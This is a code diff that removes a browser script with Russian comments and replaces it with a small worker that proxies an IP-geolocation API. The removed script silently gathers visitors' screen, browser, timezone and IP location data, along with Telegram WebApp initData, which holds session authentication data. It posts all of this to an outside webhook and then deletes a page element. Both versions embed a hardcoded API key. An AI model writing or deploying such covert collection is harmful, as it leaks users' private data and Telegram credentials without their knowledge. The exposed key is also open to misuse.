@@ -1,62 +1,13 @@
-async function getIpLocation(url) {  
-  try {
-    const response = await fetch(url);
-    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-    return await response.json();
-  } catch (error) {
-    return { error: error.message };
-  }
-}
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
 
-async function collectUserData() {
-  const data = {
-    screen: {
-      width: window.screen.width,
-      height: window.screen.height
-    },
-    browser: navigator.userAgent,
-    timezone: {
-      zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      offset: new Date().getTimezoneOffset(),
-      offsetHours: -(new Date().getTimezoneOffset() / 60)
-    }
-  };
-
-  // Получаем данные IP (если API доступно)
-  try {
-    const ipData = await getIpLocation('https://api.ip2location.io/?key=687D5768B7A7FBB61B883B574B92ED66');
-    data.ipInfo = ipData;
-  } catch (e) {
-    data.ipError = e.message;
-  }
-
-  return data;
-}
-
-async function sendToTelegram(data) {
-  const url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
+async function handleRequest(request) {
+  const apiUrl = 'https://api.ip2location.io/?key=687D5768B7A7FBB61B883B574B92ED66';
+  const response = await fetch(apiUrl);
+  const data = await response.json();
   
-  // Подготовка данных для Telegram (без сложных объектов)
-  const payload = {
-    info: data,
-    telegram: window.Telegram?.WebApp?.initData || null
-  };
-
-  try {
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-  } catch (e) {
-    console.error('Ошибка отправки в Telegram:', e);
-  }
+  return new Response(JSON.stringify(data), {
+    headers: { 'Access-Control-Allow-Origin': '*' }
+  });
 }
-
-async function main() {
-  const userData = await collectUserData();
-  await sendToTelegram(userData);
-  document.getElementById("inf")?.remove();
-}
-
-main();
